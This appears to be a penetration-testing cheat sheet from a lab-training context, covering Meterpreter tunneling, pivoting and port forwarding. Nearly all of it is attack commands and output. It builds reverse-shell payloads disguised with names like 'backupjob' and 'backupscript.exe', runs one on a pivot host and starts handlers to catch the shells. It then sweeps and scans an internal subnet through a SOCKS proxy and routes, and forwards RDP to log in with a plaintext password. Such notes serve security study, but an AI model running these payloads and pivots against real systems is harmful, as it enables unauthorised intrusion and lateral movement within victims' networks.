---
description: >-
  When we want to perform enumeration scans through the pivot host using
  Meterpreter
---

# Meterpreter Tunneling & Port Forwarding

## Tunneling

**Creating Payload for Ubuntu Pivot Host**

```shell-session
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
```

**Configuring & Starting the multi/handler**

```shell-session
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost 0.0.0.0
msf6 exploit(multi/handler) > set lport 8080
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 0.0.0.0:8080 
```

**Transferring Payload to Pivot Host**

```bash
scp backupjob ubuntu@<PivotHostIP>:~/
```

**Executing the Payload on the Pivot Host**

```shell-session
ubuntu@WebServer:~$ chmod +x backupjob 
ubuntu@WebServer:~$ ./backupjob
```

**Meterpreter Session Establishment**

```shell-session
[*] Meterpreter session 1 opened (10.10.14.18:8080 -> 10.129.202.64:39826 ) at 2022-03-03 12:27:43 -0500
meterpreter > pwd

/home/ubuntu
```

Assuming that firewall on Windows target is allowing ICMP requests, we would ping sweep on this network. We can do that using Meterpreter with the `ping_sweep` module, which will generate the ICMP traffic from the Ubuntu host to the network `172.16.5.0/23`.

**Ping Sweep**

```shell-session
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23

[*] Performing ping sweep for IP range 172.16.5.0/23
```

**Ping Sweep For Loop on Linux Pivot Hosts**

```shell-session
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

**Ping Sweep For Loop Using CMD**

```cmd-session
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

**Ping Sweep Using PowerShell**

```powershell-session
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
```

It is good to attempt our ping sweep at least twice to ensure the arp cache gets built.

If ICMP is blocked we can perform a TCP scan on the 172.16.5.0/23 network with Nmap. Instead of using SSH for port forwarding, we can also use Metasploit's post-exploitation routing module `socks_proxy` to configure a local proxy on our attack host. We will configure the SOCKS proxy for `SOCKS version 4a`. This SOCKS configuration will start a listener on port `9050` and route all the traffic received via our Meterpreter session.

**Configuring MSF's SOCKS Proxy**

```shell-session
msf6 > use auxiliary/server/socks_proxy

msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.

[*] Starting the SOCKS proxy server
msf6 auxiliary(server/socks_proxy) > options
```

**Confirming Proxy Server is Running**

```shell-session
msf6 auxiliary(server/socks_proxy) > jobs

Jobs
====

  Id  Name                           Payload  Payload opts
  --  ----                           -------  ------------
  0   Auxiliary: server/socks_proxy
```

**Adding a Line to proxychains.conf**

```shell-session
socks4 	127.0.0.1 9050
```

**Creating Routes with AutoRoute**

```shell-session
msf6 > use post/multi/manage/autoroute

msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
SUBNET => 172.16.5.0
msf6 post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux
[*] Running module against 10.129.202.64
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.5.0/255.255.254.0 from host's routing table.
[*] Post module execution completed
```

**Listing Active Routes with AutoRoute**

```shell-session
meterpreter > run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.129.0.0         255.255.0.0        Session 1
   172.16.4.0         255.255.254.0      Session 1
   172.16.5.0         255.255.254.0      Session 1
```

the route has been added to the 172.16.5.0/23 network.

**Testing Proxy & Routing Functionality**

```shell-session
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```

## Port Forwarding

**Creating Local TCP Relay**

```shell-session
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
```

* \-l -> start a listener on our attack host's local port 3300
* \-r -> forward all the packets to the remote
* \-p -> remote port

**Connecting to Windows Target through localhost**

```shell-session
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

## Meterpreter Reverse Port Forwarding

**Reverse Port Forwarding Rules**

```shell-session
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18

[*] Local TCP relay created: 10.10.14.18:8081 <-> :1234
```



**Configuring & Starting multi/handler**

```shell-session
meterpreter > bg

[*] Backgrounding session 1...
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 8081 
LPORT => 8081
msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:8081 
```

**Generating the Windows Payload**

```shell-session
carbonlky@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
```





